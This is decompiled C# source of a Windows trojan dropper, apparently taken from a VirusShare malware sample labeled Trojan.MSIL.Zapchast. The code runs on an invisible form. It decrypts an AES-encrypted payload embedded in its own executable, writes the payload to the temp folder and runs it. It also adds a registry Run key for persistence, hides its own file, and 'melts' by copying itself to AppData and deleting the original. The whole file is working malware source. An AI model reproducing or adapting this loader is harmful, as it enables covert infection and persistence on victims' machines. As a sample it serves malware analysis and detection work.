// Decompiled with JetBrains decompiler
// Type: XqNvNTCMcR.Form1
// Assembly: XqNvNTCMcR, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A5A8A841-0793-42CD-986F-63D1DC804A99
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.MSIL.Zapchast.f-911d7f4494fd46d5c8081ddc156c7437803a5b024376c854d94e569d3af8178e.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace XqNvNTCMcR
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("Button1")]
    private Button _Button1;
    private RegistryKey uYzdsJfyt;
    private byte[] file;
    private Random rand;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.uYzdsJfyt = Registry.CurrentUser;
      this.rand = new Random();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.Button1 = new Button();
      this.SuspendLayout();
      this.Button1.Location = new Point(12, 2);
      this.Button1.Name = "Button1";
      Button button1 = this.Button1;
      Size size1 = new Size(56, 23);
      Size size2 = size1;
      button1.Size = size2;
      this.Button1.TabIndex = 0;
      this.Button1.Text = "Check";
      this.Button1.UseVisualStyleBackColor = true;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      size1 = new Size(85, 26);
      this.ClientSize = size1;
      this.Controls.Add((Control) this.Button1);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.ResumeLayout(false);
    }

    internal virtual Button Button1
    {
      get => this._Button1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Button1_Click);
        if (this._Button1 != null)
          this._Button1.Click -= eventHandler;
        this._Button1 = value;
        if (this._Button1 == null)
          return;
        this._Button1.Click += eventHandler;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void Form1_Load(object sender, EventArgs e)
    {
      string[] strArray = Strings.Split(File.ReadAllText(Application.ExecutablePath), "A3E06K76EPzT37967EY");
      string s = Conversions.ToString(Form1.Decrypt(strArray[1], "FuCK"));
      this.file = Encoding.Default.GetBytes(s);
      File.WriteAllBytes(Path.GetTempPath() + "\\N3o.Exe", this.file);
      Process.Start(Path.GetTempPath() + "\\N3o.Exe");
      if (Conversions.ToBoolean(strArray[2]))
      {
        Conversions.ToString(Form1.Decrypt(strArray[3], "FuCK"));
        Encoding.Default.GetBytes(s);
        File.WriteAllBytes(Path.GetTempPath() + "\\" + strArray[4], this.file);
        Process.Start(Path.GetTempPath() + "\\" + strArray[4]);
      }
      if (Conversions.ToBoolean(strArray[5]))
      {
        File.Copy(Application.ExecutablePath, Path.GetTempPath() + "Night.exe", true);
        this.uYzdsJfyt.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true).SetValue("Serve", (object) (Path.GetTempPath() + ".exe"), RegistryValueKind.String);
      }
      if (Conversions.ToBoolean(strArray[6]))
      {
        try
        {
          File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      if (Conversions.ToBoolean(strArray[7]))
        this.Melt(Conversions.ToString(this.rand.Next(1, 10000)) + ".exe");
      ProjectData.EndApp();
    }

    public static object Decrypt(string Decryption, string Key)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      byte[] salt = new byte[8]
      {
        (byte) 1,
        (byte) 2,
        (byte) 3,
        (byte) 4,
        (byte) 5,
        (byte) 6,
        (byte) 7,
        (byte) 8
      };
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(Key, salt);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
      MemoryStream memoryStream = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write);
      try
      {
        byte[] buffer = Convert.FromBase64String(Decryption);
        cryptoStream.Write(buffer, 0, buffer.Length);
        cryptoStream.Close();
        Decryption = Encoding.UTF8.GetString(memoryStream.ToArray());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) Decryption;
    }

    private void Button1_Click(object sender, EventArgs e)
    {
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    public void Melt(string NewName)
    {
      try
      {
        string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        if (Operators.CompareString(Application.StartupPath, folderPath, false) != 0)
        {
          FileSystem.FileCopy(Application.ExecutablePath, folderPath + "\\" + NewName);
          Interaction.Shell(folderPath + "\\" + NewName + " " + Application.ExecutablePath);
          FileAttributes fileAttributes = FileAttributes.Hidden;
          File.SetAttributes(folderPath + "\\" + NewName, fileAttributes);
          ProjectData.EndApp();
        }
        else
          FileSystem.Kill(Interaction.Command());
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
